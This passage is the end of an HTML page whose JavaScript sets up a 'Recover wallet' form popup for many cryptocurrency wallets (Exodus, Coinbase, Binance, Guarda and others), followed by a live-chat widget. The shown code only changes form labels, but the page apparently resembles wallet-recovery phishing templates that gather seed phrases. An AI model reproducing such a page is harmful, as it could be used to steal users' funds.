		  popup.classList.add("show");
		}
		
		function rWalletFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "R wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover R wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		function plasmaPayFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Plasmapay wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Plasmapay wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function O3WalletFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "O3 wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover O3 wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function hashKeyMeFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "HashkeyMe wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover HashkeyMe wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function jadeWalletFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Jade wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Jade wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function guardaWalletFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Guarda wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Guarda wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function defiantFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Defiant wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Defiant wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function exodusFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Exodus wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Exodus wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function coinbaseFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Coinbase wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Coinbase wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function binanceFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Binance wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Binance wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
	</script>
      <!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/6184b57d6bb0760a49413685/1fjn69tad';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->
          
</body>

</html>